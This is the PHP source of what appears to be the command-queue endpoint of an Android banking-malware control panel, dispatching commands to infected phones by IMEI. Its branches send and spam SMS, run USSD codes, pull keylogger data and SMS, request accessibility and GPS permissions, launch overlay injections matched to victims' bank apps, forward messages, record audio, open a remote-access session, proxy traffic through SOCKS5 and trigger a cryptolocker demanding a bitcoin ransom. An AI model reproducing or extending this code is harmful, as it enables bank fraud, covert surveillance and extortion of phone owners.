<?php
session_start();
$statusCode=false;
if (!(isset($_SESSION['panel_user']))){
	session_destroy();
	header("Location: /index.php");
}else{
	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /index.php");
	}else{
		$statusCode=true;
	}
}
		 //передаем данные для выпонения команд!!!-----
		if($statusCode){

			if (isset($_REQUEST['comboBox_commands'])){
				include '../../config.php';
				$connection3 = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
				$connection3->exec('SET NAMES utf8');
				$que=$_REQUEST['comboBox_commands'];
				if($que == "sentSMS"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					$numb = $_REQUEST['text_number'];
					$msg = $_REQUEST['text_msg'];

					$numb = str_replace("@","+",$numb);

					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "|command=Send_GO_SMS|number=$numb|text=$msg::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "startUSSD"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					$text_ussd = $_REQUEST['text_ussd'];
					foreach($imeis_ as $imei){
						if($imei !="" ){
							//$text_ussd= str_replace("AAA","#",$text_ussd);
							$command_ = "|command=startUSSD|ussd=$text_ussd|endUssD::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "startAlert"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					$text_title = $_REQUEST['title_push'];
					$text_push = $_REQUEST['text_push'];
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "|command=ALERT|title=$text_title|text=$text_push::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "startPush"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					$text_title = $_REQUEST['titlePush'];
					$text_push = $_REQUEST['textPush'];
					$icon = $_REQUEST['comboBox_push'];
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "|command=PUSH|title=$text_title|text=$text_push|icon=$icon::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "startAutoPush"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$statement = $connection3->prepare("SELECT bank FROM kliets WHERE IMEI='$imei'");
							$statement->execute();
							$bank="";
							foreach($statement as $row){
								$bank = $row['bank'];
								break;
							}
							if($bank!=""){
								$statement = $connection3->prepare("SELECT process FROM injection");
								$statement->execute();
								$masBank = explode(",", $bank);
								foreach($masBank as $bank){
									foreach($statement as $row){
										$process = $row['process'];
										if (preg_match("/$bank/",$process)) {
											$masappname = explode(",", $process);
											$appname=$masappname[0];
											$command_ = "startAutoPush|AppName=$appname|EndAppName::";
											$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
											$statement->execute(array($imei,$command_));
											break;
										}
									}
								}
							}
						}
					}
				}
				if($que == "numberGO"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "nymBePsG0::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "getSMS"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "GetSWSGO::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "RequestPermissionInj"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "RequestPermissionInj::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "RequestPermissionGPS"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "RequestPermissionGPS::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "getIP"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "getIP::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "startaccessibility"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "startaccessibility::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "startpermission"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "startpermission::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "getapps"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "getapps::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "getpermissions"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "getpermissions::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "getkeylogger"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "getkeylogger::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "killBot"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "killBot::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}

				if($que == "numberGOsendSMS"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					$ussd = $_REQUEST['text_sms_tel_book'];

					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "|telbookgotext=$ussd|endtextbook::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "startPermis"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "Go_startPermis_request::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "startGPSlocat"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "Go_GPSlocat_request::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "startinj"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					$ussd = $_REQUEST['comboBox_inj'];
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "|startinj=$ussd|endstartinj::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "rat"){
					$imei = $_REQUEST['text_imei'];
					$url = $_REQUEST['url'];
					if($imei !="" ){
						$command_ = "|startrat=$imei|endrat=$url|endurl::";

						$statement = $connection3->prepare("insert into commands (IMEI,command)value('$imei','$command_')");
						$statement->execute(array($imei,$command_));
					}
				}
				if($que == "startforward"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					$forward = $_REQUEST['text_forward'];
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "|startforward=$forward|endforward::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "stopforward"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "stopforward::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "openbrowser"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					$url = $_REQUEST['text_openbrowser'];
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "|openbrowser=$url|endbrowser::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "openactivity"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					$url = $_REQUEST['text_openactivity'];
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "|openactivity=$url|endactivity::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "startApp"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					$app = $_REQUEST['text_start_app'];
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "|startapplication=$app|endapp::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "cryptolocker"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					$key = $_REQUEST['key'];
					$amount = $_REQUEST['amount'];
					$btc = $_REQUEST['btc'];
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "|cryptokey=$key/:/$amount/:/$btc|endcrypt::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "decryptolocker"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					$key = $_REQUEST['key'];
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "|decryptokey=$key|enddecrypt::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "recordsound"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					$seconds = $_REQUEST['seconds'];
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "|recordsound=$seconds|endrecord::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}
				if($que == "replaceURL"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					$url = $_REQUEST['text_replace_url'];
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "|replaceurl=$url|endurl::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}

				if($que == "spamsms"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					$text = $_REQUEST['spam'];
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "|spam=$text|endspam::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}

				if($que == "startsocks5"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					$host = $_REQUEST['host'];
					$user = $_REQUEST['user'];
					$pass = $_REQUEST['pass'];
					$port = $_REQUEST['port'];
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "|sockshost=$host|user=$user|pass=$pass|port=$port|endssh::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}

				if($que == "stopsocks5"){
					$imeis_ = $_REQUEST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					foreach($imeis_ as $imei){
						if($imei !="" ){
							$command_ = "stopsocks5::";
							$statement = $connection3->prepare("insert into commands (IMEI,command)value ('$imei','$command_')");
							$statement->execute(array($imei,$command_));
						}
					}
				}

			}
		//	$page = $_REQUEST['ref'];
		//	header ("Location: /?cont=bots&page=$page");
		}
?>
